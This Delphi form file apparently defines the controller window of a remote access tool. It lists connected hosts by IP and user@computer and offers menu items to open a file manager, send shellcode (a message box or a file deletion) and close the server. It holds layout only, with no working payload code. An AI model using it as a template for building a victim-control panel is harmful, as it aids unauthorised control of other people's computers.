object Form1: TForm1
  Left = 420
  Top = 228
  Width = 529
  Height = 329
  Caption = 'Form1'
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  OnCreate = FormCreate
  PixelsPerInch = 96
  TextHeight = 13
  object ListView1: TListView
    Left = 8
    Top = 8
    Width = 505
    Height = 281
    Columns = <
      item
        AutoSize = True
        Caption = 'IP'
      end
      item
        AutoSize = True
        Caption = 'User@Computer'
      end>
    ReadOnly = True
    RowSelect = True
    PopupMenu = PopupMenu1
    TabOrder = 0
    ViewStyle = vsReport
  end
  object PopupMenu1: TPopupMenu
    Left = 360
    Top = 56
    object Filemanager1: TMenuItem
      Caption = 'Filemanager'
      OnClick = Filemanager1Click
    end
    object SendShellcode1: TMenuItem
      Caption = 'Send Shellcode'
      object MessageBox1: TMenuItem
        Caption = 'MessageBox'
        OnClick = MessageBox1Click
      end
      object DeleteFile1: TMenuItem
        Caption = 'Delete File'
        OnClick = DeleteFile1Click
      end
    end
    object CloseServer1: TMenuItem
      Caption = 'Close Server'
      OnClick = CloseServer1Click
    end
  end
end
